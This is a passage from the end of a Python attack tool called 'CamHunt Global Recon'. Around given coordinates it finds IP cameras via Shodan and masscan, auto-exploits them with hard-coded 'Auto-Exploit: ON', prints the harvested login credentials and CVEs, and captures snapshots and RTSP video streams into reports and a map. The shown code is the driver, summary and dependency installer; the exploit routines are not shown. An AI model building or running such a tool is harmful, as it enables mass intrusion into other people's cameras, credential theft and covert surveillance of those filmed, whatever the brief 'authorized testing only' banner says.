            print(f"\n{c(Colors.RED)}  💀 EXPLOITED CAMERAS:{Colors.ENDC}")
            for cam in exploited_cams[:15]:
                ip = cam["ip"]
                port = cam.get("port", 80)
                brand = cam.get("brand", "Unknown")
                creds = cam.get("credentials", {})
                exploits = cam.get("exploit_details", [])
                cve_list = ", ".join([e.get("cve", "?") for e in exploits[:3] if isinstance(e, dict) and e.get("cve")])
                print(f"  {c(Colors.RED)}    [{ip}:{port}] {brand} - {cve_list}{Colors.ENDC}")
                if creds:
                    u = creds.get("http_user", creds.get("rtsp_user", ""))
                    p = creds.get("http_pass", creds.get("rtsp_pass", ""))
                    if u:
                        print(f"    {c(Colors.OKGREEN)}      Credentials: {u}:{p}{Colors.ENDC}")

        print(f"\n{c(Colors.BOLD)}  📁 Reports saved in: {self.output_dir}/{Colors.ENDC}")
        print(f"  {c(Colors.OKCYAN)}    📊 report.html - Interactive HTML Dashboard{Colors.ENDC}")
        if os.path.exists(os.path.join(self.output_dir, "map.html")):
            print(f"  {c(Colors.OKCYAN)}    🗺  map.html - Interactive Leaflet Map{Colors.ENDC}")
        print(f"  {c(Colors.OKCYAN)}    📋 results.json - Machine-readable data{Colors.ENDC}")
        print(f"  {c(Colors.OKCYAN)}    📋 results.csv - Spreadsheet format{Colors.ENDC}")
        if self.stats["snapshots_taken"] > 0:
            print(f"  {c(Colors.OKCYAN)}    📸 snapshots/ - Captured images{Colors.ENDC}")
        if self.stats["streams_captured"] > 0:
            print(f"  {c(Colors.OKCYAN)}    📹 streams/ - Captured RTSP streams{Colors.ENDC}")
        print()

    # ──────────────────────────────────────────────────────────────
    # RUN
    # ──────────────────────────────────────────────────────────────

    def run(self):
        self.scan_start_time = time.time()
        self.print_banner()

        try:
            # Phase 1: Shodan
            self.phase_1_shodan_scan()

            # Phase 2: Masscan
            self.phase_2_masscan()

            # Phase 3: Deep probe
            self.phase_3_deep_probe()

            # Phase 4: Stream capture
            if self.stream_capture:
                self.phase_4_stream_capture()

            # Reports
            self._generate_html_report()
            self._generate_csv_report()
            self._print_summary()

        except KeyboardInterrupt:
            print(f"\n  {c(Colors.WARNING)}[!] Scan interrupted by user{Colors.ENDC}")
            self.running = False
            self._print_summary()
        except Exception as e:
            print(f"\n  {c(Colors.FAIL)}[!] Fatal error: {e}{Colors.ENDC}")
            import traceback
            traceback.print_exc()


# ═══════════════════════════════════════════════════════════════
# DEPENDENCY CHECK
# ═══════════════════════════════════════════════════════════════

def install_dependencies():
    """Check and install required packages"""
    required_pips = {
        "requests": "requests",
        "shodan": "shodan",
        "folium": "folium",
    }
    required_system = {
        "masscan": "masscan",
        "nmap": "nmap",
        "ffmpeg": "ffmpeg",
    }
    print(f"\n{c('[*] Checking Python packages...', Colors.OKBLUE)}")
    for mod, pkg in required_pips.items():
        try:
            __import__(mod)
            print(f"  {c('[✓]', Colors.OKGREEN)} {mod}")
        except ImportError:
            print(f"  {c(Colors.WARNING)}[!] {mod} not found. Installing...{Colors.ENDC}")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "-q"])
                print(f"  {c(Colors.OKGREEN)}[✓] {mod} installed{Colors.ENDC}")
            except:
                print(f"  {c(Colors.FAIL)}[✗] Failed to install {mod}{Colors.ENDC}")

    print(f"\n{c('[*] Checking system tools...', Colors.OKBLUE)}")
    for cmd, pkg in required_system.items():
        try:
            subprocess.run([cmd, "--version"], capture_output=True, timeout=5)
            print(f"  {c(Colors.OKGREEN)}[✓] {cmd}{Colors.ENDC}")
        except:
            print(f"  {Colors.WARNING}[!] {cmd} not found. Hãy cài đặt {pkg} cho Windows.{Colors.ENDC}")


# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════

def main():
    # Check deps first
    install_dependencies()

    # Cách sửa đúng:
    print(f"\n{c('╔══════════════════════════════════════════════════════════════╗', Colors.HEADER)}")
    print(f"{c('║  ⚡ CamHunt Global Recon - Initializing...                ║', Colors.HEADER)}")
    print(f"{c('╚══════════════════════════════════════════════════════════════╝', Colors.HEADER)}")

    # Get coordinates
    lat, lng = DEFAULT_COORDS["lat"], DEFAULT_COORDS["lng"]
    try:
        resp = input(f"{c(Colors.OKYELLOW)}[?] Use default coordinates ({lat}, {lng})? (Y/n): {Colors.ENDC}")
        if resp.lower() == 'n':
            try:
                lat = float(input(f"{c(Colors.OKYELLOW)}[?] Enter latitude: {Colors.ENDC}"))
                lng = float(input(f"{c(Colors.OKYELLOW)}[?] Enter longitude: {Colors.ENDC}"))
            except:
                print(f"  {c(Colors.WARNING)}Invalid input, using defaults{Colors.ENDC}")
                lat, lng = DEFAULT_COORDS["lat"], DEFAULT_COORDS["lng"]
    except:
        lat, lng = DEFAULT_COORDS["lat"], DEFAULT_COORDS["lng"]

    # Get radius
    try:
        radius_input = input(f"{c(Colors.OKYELLOW)}[?] Scan radius in km (default: 50): {Colors.ENDC}")
        radius = float(radius_input) if radius_input.strip() else 50.0
    except:
        radius = 50.0

    # Confirm
    area = math.pi * radius**2
    print(f"\n{c(Colors.OKGREEN)}[✓] Configuration:{Colors.ENDC}")
    print(f"  📍 Center: {lat}, {lng}")
    print(f"  📏 Radius: {radius} km")
    print(f"  🌐 Area: ~{area:.0f} km²")
    print(f"  🔧 Threads: {MAX_THREADS}")
    print(f"  💀 Auto-Exploit: ON")
    print(f"  📹 Stream Capture: ON")

    print(f"\n{c(Colors.WARNING)}⚠ WARNING: This tool is for authorized security testing only!{Colors.ENDC}")
    print(f"{c(Colors.WARNING)}  Unauthorized use may violate computer fraud laws.{Colors.ENDC}")

    input(f"\n{c(Colors.OKYELLOW)}[?] Press Enter to start scanning...{Colors.ENDC}")

    # Create scanner and run
    scanner = CamHuntGlobalRecon(
        lat=lat,
        lng=lng,
        radius_km=radius,
        shodan_key=SHODAN_API_KEY,
        threads=MAX_THREADS,
        auto_exploit=True,
        stream_capture=True,
    )
    scanner.run()

    print(f"\n{c(Colors.OKGREEN)}[✓] Scan complete. Reports saved to: {scanner.output_dir}/{Colors.ENDC}")


if __name__ == "__main__":
    main()
